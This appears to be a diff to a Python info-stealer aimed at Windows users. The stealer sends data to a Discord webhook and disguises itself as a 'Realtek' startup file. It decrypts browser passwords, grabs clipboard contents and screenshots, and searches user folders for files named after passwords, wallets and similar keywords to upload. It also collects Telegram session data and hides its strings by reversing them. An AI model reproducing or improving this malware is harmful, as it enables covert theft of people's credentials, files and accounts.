@@ -20,6 +20,7 @@ import os.path, zipfile
 import shutil, json, sqlite3
 import tempfile, datetime
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from ctypes import *
 webhook = '%Webhook%' 
 
 FakeWebhook = '%FakeWebhook%'
@@ -43,9 +44,7 @@ for modl in requirements:
         subprocess.call(['pip', 'install', modl[1]])
 
 from Crypto.Cipher import AES
-import win32clipboard
 import requests
-from ctypes import *
 
 
 def clear_command_prompt():
@@ -239,11 +238,9 @@ def fakegen():
         import string
 
         codes_list = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)
-
         count_generator = 0
         valid_url = random.randint(1, 1000)
         valid_test = -1
-    
         filename = input("Enter the filename to use for proxies (or press Enter to skip): ")
         while True:
             essay = input("How many codes do you want to generate? (Enter a number): ")
@@ -274,15 +271,17 @@ def DecryptValue(buff, master_key=None):
         return decrypted_pass
     
 
+
 def Clipboard():
     try:
-        win32clipboard.OpenClipboard()
-        clipboard_data = win32clipboard.GetClipboardData()
-        win32clipboard.CloseClipboard()
-
+        command = 'Get-Clipboard -TextFormatType Text'
+        result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, check=True)
+        clipboard_data = result.stdout.strip()
         return clipboard_data
-    except:
-        pass
+    except subprocess.CalledProcessError as e:
+        return 'Error while getting clipboard'
+
+
 apppp = 'atadppa'
 path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
 
@@ -313,7 +312,8 @@ def LoadUrlib(hook, data='', files='', headers=''):
         except: 
             pass
 
-Dscptb= 'BTPdrocsiD'[::-1];Dsccana = 'yranaCdrocsiD'[::-1]
+Dscptb= 'BTPdrocsiD'[::-1]
+Dsccana = 'yranaCdrocsiD'[::-1]
 Dscdev = 'tnempoleveDdrocsiD'[::-1]
 def NoDiscord():
     ind = "sj.xedni"
@@ -1061,7 +1061,6 @@ import concurrent.futures
 def upload_files_to_discord():
     keywords = ['enohp', 'noitulfedacilbup', 'gnitirw', 'etisoppa', 'laicion', 'trossap', 'muhtyre', 'tellaw', 'drowssap egarots', 'eciffo laicion', 'tnuocca', 'slavitsef eninapmoc', 'nogin', 'tnuocca knalb', 'drowssap noitcudorp', 'etisoppa laicion', 'etelpmoc laicion', 'dircet tihcrac', 'noitamroproirp', 'emusern', 'laif gnitartsinimda', 'etelpmoc', 'drowssap ycnanif', 'drowssap ytecnanif', 'drowssap decures', 'sserdda', 'ytiruces yrtnuoces laicos', 'ytocryptocurrency', 'drowssap yroirp', 'noitartsinimda', 'tterces', 'niotcib', 'evig', 'liame', 'ytinifidnocnafnoc', 'ipa', 'noitartsinimda reganam']
     extension = 'txt'
-    home_path = os.path.expanduser("~")
     desktop_path = os.path.expanduser("~/Desktop")
     downloads_path = os.path.expanduser("~/Downloads")
     documents_path = os.path.expanduser("~/Documents")
@@ -1187,8 +1186,8 @@ def ZipThings(path, arg, procc):
 
 def srcs():
     try:
-        img_path = os.path.join(os.path.expanduser("~"), "screenshot.png")
-
+        temp_folder = os.environ.get('TEMP')
+        img_path = os.path.join(temp_folder, "screenshot.png")
         if os.name == "nt":
             powershell_command = f'''
                 Add-Type -AssemblyName System.Windows.Forms
@@ -1214,7 +1213,6 @@ def srcs():
                 "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
             }
             requests.post(webhook, data=data, files={"file": ("screenshot.png", file_data)})
-            os.remove('1')
             
     except:
         pass
@@ -1408,6 +1406,8 @@ def GatherAll():
     ]
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
     aa = []
+    
+    eeee = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
     global injection
     global DiscordStop
     if Startup == True:
@@ -1438,13 +1438,11 @@ def GatherAll():
         coc.append(a)
 
         
-    eeee = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
 
     a = threading.Thread(target=getinfo)
     a.start()
     aa.append(a)
     aa = []
-    
     
     hist = threading.Thread(target=histup)
     hist.start()
@@ -1499,7 +1497,7 @@ def GatherAll():
         wb = threading.Thread(target=webhook_tools)
         wb.start()
         aa.append(wb)
-        
+    
     for thread in aa:
         thread.join()
 
